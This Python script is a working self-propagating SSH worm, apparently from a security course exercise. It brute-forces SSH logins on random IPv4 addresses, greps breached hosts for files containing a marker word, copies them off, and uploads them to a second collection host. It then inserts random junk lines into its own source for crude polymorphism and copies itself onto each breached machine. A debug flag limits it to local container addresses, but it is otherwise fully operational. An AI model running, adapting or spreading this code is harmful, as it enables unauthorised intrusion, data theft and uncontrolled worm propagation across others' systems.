import sys
import os
import random
import paramiko
import scp
import select
import signal


def sig_handler(signum, frame): os.kill(os.getpid(), signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1
NHOSTS = NUSERNAMES = NPASSWDS = 3


trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
              bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
              cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
              faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
              kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
              let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
              odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
              pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
              sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
              wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
            ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()


def get_new_usernames(how_many):
    if debug: return ['root']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    usernames = [''.join(map(lambda x: random.sample(trigrams, 1)[0]
                             if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3))) for x in range(how_many)]
    return usernames


def get_new_passwds(how_many):
    if debug: return ['mypassword']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    passwds = [''.join(map(lambda x: random.sample(trigrams, 1)[0] + (str(random.randint(0, 9))
                                                                     if random.random() > 0.5 else '') if int(selector[x]) == 1
                           else random.sample(digrams, 1)[0], range(3))) for x in range(how_many)]
    return passwds


def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.2']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(lambda x: str(1 + random.randint(0, x)), [223, 223, 223, 223])
        ipaddresses.append(first + '.' + second + '.' + third + '.' + fourth)
    return ipaddresses


# Random code variation function
def get_random_variation():
    variation_options = [
        '# This is a random comment\n',  # Random comment
        '# This is a random comment2\n',  # Random comment 2
        '# This is a random comment3\n',  # Random comment 3
        '# This is a random comment4\n',  # Random comment 4
        '# This is a random comment5\n',  # Random comment 5
        '    \n',  # Random indentation
        'import antigravity\n',  # Surprise import statement
        'import this\n',  # Zen of Python poem
        'print("Hello, World!")\n',  # Greeting
        'for i in range(10):\n    print(i)\n',  # Loop example
        'for i in range(99):\n    print(i)\n',  # Loop example
        'x = 42\n',  # Assignment
        'def foo():\n    return "bar"\n',  # Function definition
        'print("Beep! Beep! I am a robot!")\n',  # Robotic message
        'print([x for x in range(10)])\n',  # List comprehension
        'print("Custom variation")\n',  # Custom message
    ]
    return random.choice(variation_options)



while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd, user, ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("\n\nconnected\n")
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    cmd = 'grep -ls abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error:
                        print(error)
                        continue
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # Read the content of sys.argv[0] and apply random variation
                    with open(sys.argv[0], 'r') as script_file:
                        script_content = script_file.read()
                    # Split the script_content into lines
                    script_lines = script_content.split('\n')
                    # Find indices of lines that are empty or contain only whitespace
                    empty_line_indices = [idx for idx, line in enumerate(script_lines) if not line.strip()]
                    # Choose a random index from the list of empty line indices
                    if empty_line_indices:
                        random_index = random.choice(empty_line_indices)
                    else:
                        # If no empty lines are found, fall back to inserting at a random index
                        random_index = random.randint(0, len(script_content))
                    # Insert random_variation at the random index in script_content
                    modified_content = '\n'.join(script_lines[:random_index]) + '\n' + get_random_variation() + '\n' + '\n'.join(script_lines[random_index:])
                    # Write the modified content to a temporary file
                    temp_filename = f'{sys.argv[0]}.tmp'
                    with open(temp_filename, 'w') as temp_file:
                        temp_file.write(modified_content)
                    filename_without_extension = os.path.splitext(temp_filename)[0]
                    scpcon.put(temp_filename, remote_path=filename_without_extension)  # Deploy the modified script
                    scpcon.close()
                    os.remove(temp_filename)  # Remove the temporary file
                except:
                    continue
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to develop the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect('172.17.0.3', port=22, username='root', password='mypassword', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to other host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except:
                        print("No uploading of developed files\n")
                        continue
    if debug: break
